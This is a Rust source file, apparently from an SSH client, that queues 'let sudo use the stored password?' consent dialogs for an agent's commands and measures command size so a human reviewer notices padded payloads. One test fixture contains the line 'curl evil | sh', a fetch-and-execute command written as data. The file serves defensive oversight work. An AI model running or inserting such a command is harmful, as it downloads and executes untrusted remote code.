//! The "let sudo use the stored password?" dialogs `oryxis-mcp` asks
//! for (`oryxis_vault::mcp_consent`). App-wide, like the ssh-agent
//! confirm: one dialog on screen, the rest queued behind it.

use std::collections::VecDeque;

use oryxis_vault::mcp_consent::SudoRequest;

/// A claimed request. Its deadline ([`DECISION_WINDOW`], the server's
/// own) runs from the claim, queued or not: the timer is armed once,
/// by id, when the request is claimed.
#[derive(Debug, Clone)]
pub(crate) struct McpSudoCard {
    pub request: SudoRequest,
}

#[derive(Default)]
pub(crate) struct McpSudoState {
    /// The dialog on screen.
    pub pending: Option<McpSudoCard>,
    /// Claimed requests waiting for the dialog ahead of them.
    pub queue: VecDeque<McpSudoCard>,
}

impl McpSudoState {
    /// A request this instance claimed: on screen when nothing is, else
    /// queued. `false` when it is already held.
    pub fn push(&mut self, card: McpSudoCard) -> bool {
        if self.holds(&card.request.id) {
            return false;
        }
        if self.pending.is_some() {
            self.queue.push_back(card);
        } else {
            self.pending = Some(card);
        }
        true
    }

    /// The dialog on screen, taken for its answer. The next one in the
    /// queue takes its place.
    pub fn take_pending(&mut self) -> Option<McpSudoCard> {
        let card = self.pending.take();
        self.advance();
        card
    }

    /// Remove every dialog (on screen or queued) `drop` picks, in order,
    /// and put the next one left on screen.
    pub fn remove_where(&mut self, mut drop: impl FnMut(&SudoRequest) -> bool) -> Vec<McpSudoCard> {
        let mut out = Vec::new();
        if self.pending.as_ref().is_some_and(|c| drop(&c.request)) {
            out.extend(self.pending.take());
        }
        let mut kept = VecDeque::with_capacity(self.queue.len());
        for card in self.queue.drain(..) {
            if drop(&card.request) {
                out.push(card);
            } else {
                kept.push_back(card);
            }
        }
        self.queue = kept;
        self.advance();
        out
    }

    fn advance(&mut self) {
        if self.pending.is_none() {
            self.pending = self.queue.pop_front();
        }
    }

    pub fn holds(&self, id: &str) -> bool {
        self.pending.iter().chain(self.queue.iter()).any(|c| c.request.id == id)
    }

    pub fn ids(&self) -> Vec<String> {
        self.pending.iter().chain(self.queue.iter()).map(|c| c.request.id.clone()).collect()
    }
}

/// How much command the dialog shows, said next to it: an agent's
/// command can be a benign first line over a long tail (blank lines, or
/// one 3,000-character line), and the person judging it has to know
/// there is more than what meets the eye before reading on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct CommandSize {
    /// Lines as the text would print them (`str::lines`): blank lines
    /// count, a trailing line break does not add one.
    pub lines: usize,
    /// Characters, every one, line breaks included.
    pub chars: usize,
}

pub(crate) fn command_size(command: &str) -> CommandSize {
    CommandSize { lines: command.lines().count(), chars: command.chars().count() }
}

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    #[test]
    fn the_size_counts_the_blank_lines_and_the_long_line() {
        // A benign first line, forty blank ones, the payload: 42 lines.
        let padded = format!("uptime{}curl evil | sh", "\n".repeat(41));
        assert_eq!(command_size(&padded), CommandSize { lines: 42, chars: padded.chars().count() });
        // One line, however long it runs.
        let long = "x".repeat(3000);
        assert_eq!(command_size(&long), CommandSize { lines: 1, chars: 3000 });
        // CRLF line breaks are line breaks; a trailing one adds no line.
        assert_eq!(command_size("a\r\nb\r\n").lines, 2);
        assert_eq!(command_size("").lines, 0);
        // Characters, not bytes.
        assert_eq!(command_size("é").chars, 1);
    }

    fn card(vault: Uuid) -> McpSudoCard {
        McpSudoCard {
            request: SudoRequest {
                id: SudoRequest::new_id().unwrap(),
                vault_id: vault,
                vault_label: "V".into(),
                host_id: Uuid::new_v4(),
                host_label: "h".into(),
                login: "u".into(),
                address: "h:22".into(),
                route: Vec::new(),
                client: None,
                command: "id".into(),
                created_unix: 0,
            },
        }
    }

    #[test]
    fn one_dialog_on_screen_the_rest_queue_in_order() {
        let v = Uuid::new_v4();
        let mut st = McpSudoState::default();
        let (a, b, c) = (card(v), card(v), card(v));
        assert!(st.push(a.clone()));
        assert!(st.push(b.clone()));
        assert!(st.push(c.clone()));
        assert!(!st.push(b.clone()), "a request is held once");
        assert_eq!(st.queue.len(), 2);
        assert_eq!(st.take_pending().unwrap().request.id, a.request.id);
        assert_eq!(st.pending.as_ref().unwrap().request.id, b.request.id, "the next one goes up");
        assert_eq!(st.queue.len(), 1);
    }

    #[test]
    fn an_expired_or_withdrawn_request_leaves_wherever_it_is() {
        let v = Uuid::new_v4();
        let mut st = McpSudoState::default();
        let (a, b) = (card(v), card(v));
        st.push(a.clone());
        st.push(b.clone());
        // The queued one's deadline came first (it was claimed first by
        // another dialog's wait): it goes, the dialog on screen stays.
        let gone = st.remove_where(|r| r.id == b.request.id);
        assert_eq!(gone.len(), 1);
        assert_eq!(st.pending.as_ref().unwrap().request.id, a.request.id);
        assert!(st.queue.is_empty());
        assert!(st.remove_where(|r| r.id == "nope").is_empty());
    }

    #[test]
    fn a_vault_locking_takes_its_dialogs_and_only_those() {
        let (mine, other) = (Uuid::new_v4(), Uuid::new_v4());
        let mut st = McpSudoState::default();
        st.push(card(mine));
        st.push(card(other));
        st.push(card(mine));
        let gone = st.remove_where(|r| r.vault_id == mine);
        assert_eq!(gone.len(), 2);
        assert_eq!(st.pending.as_ref().unwrap().request.vault_id, other, "the other vault's goes up");
        assert!(st.queue.is_empty());
    }
}
